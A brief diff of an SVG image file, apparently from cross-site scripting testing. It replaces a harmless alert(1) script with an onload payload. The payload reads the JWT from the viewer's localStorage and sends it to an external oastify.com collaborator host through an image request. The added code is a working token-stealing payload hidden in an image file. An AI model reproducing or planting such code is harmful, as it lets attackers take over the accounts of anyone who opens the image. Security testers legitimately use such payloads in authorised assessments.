@@ -1,5 +1,4 @@
-<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500">
-    <script>
-        alert(1)
-    </script>
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<svg xmlns="http://www.w3.org/2000/svg" 
+     onload="new Image().src='https://48aho3b0it2lfyg4nimyt146wx2oqee3.oastify.com/log?c='+encodeURIComponent(localStorage.JWT)">
 </svg>
